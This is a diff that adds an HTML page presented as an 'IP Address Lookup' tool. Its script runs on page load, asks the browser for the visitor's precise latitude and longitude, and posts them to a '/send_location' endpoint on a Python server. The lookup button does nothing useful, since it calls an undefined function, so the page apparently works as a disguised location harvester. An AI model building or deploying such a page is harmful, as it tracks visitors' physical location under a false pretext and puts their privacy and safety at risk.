@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Address Lookup</title>
+    <style>
+     h1{ /* font-family :  Media Sans, sans-serif; */
+    letter-spacing: .1rem;
+    margin-top: 0;
+    margin-bottom: 0;
+    font-family: Media Sans, sans-serif;
+    font-size: 4rem;
+    font-weight: 400;
+    line-height: 1.2;
+    background-image: linear-gradient(to right, #4bb4ff, #79e885 50%, #c9e136);}
+    </style>
+</head>
+<body>
+    <h1>IP Address Lookup</h1>
+    
+    <form method="POST" action="/">
+        <button type="submit" onclick="K()">Get IP Address</button>
+    </form>
+<script>
+if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+
+                // Send data to Python server
+                fetch('/send_location', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ latitude, longitude }),
+                })
+                .then(response => response.text())
+                .then(data => {
+                    console.log(data);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+            });
+        }
+</script>
+</body>
+</html>
